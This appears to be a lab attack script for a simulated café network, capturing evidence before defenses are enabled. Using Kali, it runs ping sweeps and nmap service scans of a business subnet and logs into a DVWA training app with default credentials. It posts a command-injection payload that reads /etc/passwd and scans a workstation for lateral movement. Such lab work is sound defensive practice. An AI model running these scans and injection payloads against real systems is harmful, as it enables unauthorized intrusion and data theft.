#!/bin/bash
# run-full-attack.sh
# Executes all undefended attack scenarios from Kali in sequence.
# Run BEFORE enabling defenses to capture baseline evidence.

EVIDENCE_DIR="/evidence/attack"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================="
echo " SwagPc Café — Undefended Attack Sequence"
echo " Timestamp: $TIMESTAMP"
echo "============================================="

mkdir -p "$EVIDENCE_DIR"

# ─── ATTACK 1: Network Reconnaissance ─────────────────────────────
echo ""
echo "[ATTACK 1] Network Reconnaissance from Guest (192.168.10.50)"
echo "Target: Business Subnet 192.168.20.0/24"

# Add route via firewall router
ip route add 192.168.20.0/24 via 192.168.10.254 2>/dev/null || true

echo "--- Ping Sweep ---"
ping -c 3 192.168.20.10 | tee "$EVIDENCE_DIR/ping-dvwa-$TIMESTAMP.txt"
ping -c 3 192.168.20.25 | tee "$EVIDENCE_DIR/ping-workstation-$TIMESTAMP.txt"

echo ""
echo "--- Nmap Port Scan ---"
nmap -sV -p 22,80,443,445,3389,8080 192.168.20.0/24 | tee "$EVIDENCE_DIR/nmap-scan-$TIMESTAMP.txt"

# ─── ATTACK 2: Web Exploitation ───────────────────────────────────
echo ""
echo "[ATTACK 2] DVWA Web Application Exploitation"
echo "Target: http://192.168.20.10"

echo "--- HTTP Reachability ---"
curl -sv http://192.168.20.10 2>&1 | tee "$EVIDENCE_DIR/http-reach-$TIMESTAMP.txt" | head -n 20

echo ""
echo "--- Command Injection Payload ---"
# DVWA requires session cookie — log in first
COOKIE=$(curl -sc /tmp/dvwa-cookies.txt -d "username=admin&password=password&Login=Login" http://192.168.20.10/login.php 2>/dev/null && cat /tmp/dvwa-cookies.txt | grep PHPSESSID | awk '{print $NF}')
curl -s -b "/tmp/dvwa-cookies.txt" \
     -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" \
     "http://192.168.20.10/vulnerabilities/exec/" | tee "$EVIDENCE_DIR/cmdi-result-$TIMESTAMP.txt"

# ─── ATTACK 3: Lateral Movement ───────────────────────────────────
echo ""
echo "[ATTACK 3] Lateral Movement — reaching Employee Workstation"
echo "Target: 192.168.20.25"

echo "--- Ping ---"
ping -c 3 192.168.20.25 | tee "$EVIDENCE_DIR/lateral-ping-$TIMESTAMP.txt"

echo "--- Port scan of workstation ---"
nmap -sV -p 22,80,445,3389 192.168.20.25 | tee "$EVIDENCE_DIR/lateral-nmap-$TIMESTAMP.txt"

echo ""
echo "============================================="
echo " All attack evidence saved to $EVIDENCE_DIR"
echo " Review files in evidence/attack/ directory"
echo "============================================="
